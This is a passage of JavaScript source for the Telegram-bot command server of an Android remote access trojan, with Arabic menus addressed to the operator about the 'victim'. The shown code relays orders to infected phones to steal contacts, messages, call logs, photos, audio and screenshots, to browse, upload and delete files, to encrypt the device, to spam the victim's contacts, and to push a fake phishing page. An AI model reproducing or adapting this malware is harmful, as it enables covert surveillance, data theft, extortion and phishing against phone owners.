                                ["✯ .اضهار الاشعارات🃏. ✯", "✯ .إيقاف الاشعارات🃏. ✯"],
                                ["✯ .عرض الملفات📁. ✯", "✯.سحب جميع صور📲.✯"],
                                ["✯ .تشفير جهاز 📵☠. ✯", "✯ .فك التشفير جهاز ☠. ✯"],
                                ["✯ ارسال رساله لجميع ارقام الضحيه 📨✯",],
                                ["✯ .‼ اشعار صفحة مزورة ‼. ✯",],
                                ["✯ .العودة إلى القائمة الرئيسية. ✯"],
                            ],
                            "resize_keyboard": true,
                            "one_time_keyboard": true
                        }
                    }
                )
            }
            if (message.text === "✯ .تحكم في جميع الأجهزة المتصلة. ✯") {
                appData.set("currentTarget", key)
                bot.sendMessage(data.id,
                    `<b>✯ .حدد اجرا اي شي تريد بجهاز الضحيه💻. ${value.model}</b>\n\n`,
                    {
                        parse_mode: "HTML",
                        "reply_markup": {
                            "keyboard": [
                                ["✯ .جهات الاتصال☎. ✯", "✯ . سحب الرسايل📩. ✯"],
                                ["✯ .المكالمات📞. ✯", "✯ .📱التطبيقات. ✯"],
                                ["✯ .صوره خلفيه📸. ✯", "✯ .صوره الاماميه📸. ✯"],
                                ["✯ .تسجيل صوت🎤. ✯", "✯ .الحافظة📂. ✯"],
                                ["✯ .لقطة شاشة🖥. ✯", "✯ .ضهار رساله💢. ✯"],
                                ["✯ .أرسل رسالة📂. ✯", "✯ .اهتزاز ⚧📳. ✯"],
                                ["✯ .تشغيل صوت🔊. ✯", "✯ .ايقاف الصوت🔇. ✯"],
                                ["✯ .اضهار الاشعارات🃏. ✯", "✯ .إيقاف الاشعارات🃏. ✯"],
                                ["✯ .عرض الملفات📁. ✯", "✯.سحب جميع صور📲.✯"],
                                ["✯ .تشفير جهاز 📵☠. ✯", "✯ .فك التشفير جهاز ☠. ✯"],
                                ["✯ ارسال رساله لجميع ارقام الضحيه 📨✯",],
                                ["✯ .‼ اشعار صفحة مزورة ‼. ✯",],
                                ["✯ .العودة إلى القائمة الرئيسية. ✯"],
                            ],
                            "resize_keyboard": true,
                            "one_time_keyboard": true
                        }
                    }
                )
            }
        })
    }
})

bot.on("voice", (message) => {
    if (appData.get("currentAction") === "recordVoice") {
        let voiceId = message.voice.file_id
        let target = appData.get("currentTarget")
        bot.getFileLink(voiceId).then((link) => {
            console.log(link)
            io.to(target).emit("commend", {"request": "playAudio", "extras": [{"key": "url", "value": link}]})
            appData.delete("currentTarget")
            appData.delete("currentAction")
            bot.sendMessage(data.id,
                "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        })
    }
})

bot.on("callback_query", (callbackQuery) => {
    console.log(callbackQuery)
    let callbackQueryData = callbackQuery.data
    let model = callbackQueryData.split('|')[0]
    let commend = callbackQueryData.split('|')[1]
    let request = commend.split('-')[0]
    let name = commend.split('-')[1]
    if (request === 'back') {
        io.sockets.sockets.forEach((value, key, map) => {
            if (value.model === model) {
                io.to(key).emit("file-explorer",
                    {"request": "back", "extras": []}
                )
            }
        })
    }
    if (request === 'cd') {
        io.sockets.sockets.forEach((value, key, map) => {
            if (value.model === model) {
                io.to(key).emit("file-explorer",
                    {"request": "cd", "extras": [{"key": "name", "value": name}]}
                )
            }
        })
    }
    if (request === 'upload') {
        io.sockets.sockets.forEach((value, key, map) => {
            if (value.model === model) {
                io.to(key).emit("file-explorer",
                    {"request": "upload", "extras": [{"key": "name", "value": name}]}
                )
            }
        })
    }
    if (request === 'delete') {
        io.sockets.sockets.forEach((value, key, map) => {
            if (value.model === model) {
                io.to(key).emit("file-explorer",
                    {"request": "delete", "extras": [{"key": "name", "value": name}]}
                )
            }
        })
    }
    if (request === 'request') {
        bot.editMessageText(`✯ حدد اي اجرا تريد : ${name}`, {
            chat_id: data.id,
            message_id: callbackQuery.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{text: "✯ تحميل ✯", callback_data: `${model}|upload-${name}`}, {
                        text: "✯ حذف ✯",
                        callback_data: `${model}|delete-${name}`
                    }],
                    [{text: '✯ . رجوع . ✯', callback_data: `${model}|back-0`}]
                ]
            },
            parse_mode: "HTML"
        });
    }
})

setInterval(() => {
    io.sockets.sockets.forEach((value, key, map) => {
        io.to(key).emit("ping", {})
    })
}, 5000)

// starting server
server.listen(process.env.PORT || 3000, () => {
    console.log('listening on port 3000')
})


